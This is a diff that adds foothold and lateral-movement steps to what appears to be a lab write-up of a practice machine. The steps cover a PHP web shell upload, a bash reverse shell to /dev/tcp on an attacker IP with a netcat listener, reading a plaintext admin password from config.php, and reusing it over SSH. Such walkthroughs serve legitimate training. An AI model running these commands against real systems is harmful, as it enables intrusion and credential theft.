@@ -183,4 +183,122 @@ Seems works fine, so, let's change to POST code on proxy tab and forward steps. 
 
 # Foothold
 
+Create a test.php file:
+```shell
+└──╼ $echo "<?php phpinfo(); ?>" > test.php
+```
+
+Upload test.php file and check with gobuster where uploads are stored:
+```shell
+└──╼ $gobuster dir --url http://$SERVERIP/ --wordlist /usr/share/wordlists/dirb/big.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.114.119/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/06 20:22:44 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/_uploaded            (Status: 301) [Size: 320] [--> http://10.129.114.119/_uploaded/]
+/assets               (Status: 301) [Size: 317] [--> http://10.129.114.119/assets/]   
+/forms                (Status: 301) [Size: 316] [--> http://10.129.114.119/forms/]    
+/login                (Status: 301) [Size: 316] [--> http://10.129.114.119/login/]    
+/server-status        (Status: 403) [Size: 279]                                       
+                                                                                      
+===============================================================
+2022/09/06 20:24:09 Finished
+===============================================================
+```
+
+Lets check _uploaded/test.php folder on browser:
+
+![testphp](IMG/testphp.png)
+
+Let us now create a PHP web shell which uses the system() function and a cmd URL parameter to execute system commands.
+After the file has been uploaded, click on it in the browser and it will show a blank page, however, if we add a system command in the cmd URL parameter, the PHP backend will execute its value, e.g: ?cmd=id :
+
+![phpcmdid](IMG/phpcmdid.png)
+
+Now that we know we can execute code on the remote system, let's attempt to get a reverse shell. The
+current request is an HTTP GET request and we can attempt to use it to send a command that will grant us a
+reverse shell on the system, however, it is likely that one might encounter errors due to the presence of
+special characters in the URL (even after URL encoding them). Instead, let us convert this GET request to a
+POST request and send the reverse shell command as an HTTP POST parameter.
+Right-click inside the Request body box, and click on the "Change request method" in order to convert this
+HTTP GET request to an HTTP POST request.
+
+Send the same request to burpsuite, on proxy tab, right click and select "Change request method" This will change from HTTP GET Method to HTTP POST, this will be able to change cmd command and send to server with HTTP POST. 
+
+change id cmd command for reverseshell: ```/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.104/443 0>&1'``` type them on cmd=, select command and pres CTR+U, this shortcut direct encoding cmd command to this: ```/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.104/443+0>%261'```
+
+
+![burpreverseshell](IMG/burp_reverseshell_URL_encoding.png')
+
+On our computer:
+
+```shell
+└──╼ #nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.104] from (UNKNOWN) [10.129.114.119] 56326
+bash: cannot set terminal process group (1177): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@base:/var/www/html/_uploaded$ 
+```
+
+# Lateral Movement
+
+Lets take a look on www-data dir:
+
+```shell
+www-data@base:/var/www/html/_uploaded$ cat /var/www/html/login/config.php
+cat /var/www/html/login/config.php
+<?php
+$username = "admin";
+$password = "thisisagoodpassword";
+```
+
+Search for other local accounts on server and try to login with the same admin password:
+
+```shell
+www-data@base:/var/www/html/_uploaded$ ls /home
+ls /home
+john
+www-data@base:/var/www/html/_uploaded$ 
+```
+
+Try to ssh login with john account:
+```shell
+└──╼ $ssh john@$SERVERIP
+john@10.129.114.119's password: 
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Sep  6 19:17:26 UTC 2022
+
+  System load:  0.0               Processes:             108
+  Usage of /:   62.7% of 2.83GB   Users logged in:       0
+  Memory usage: 8%                IP address for ens160: 10.129.114.119
+  Swap usage:   0%
+
+
+10 updates can be applied immediately.
+8 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+john@base:~$ 
+
+```
+
 
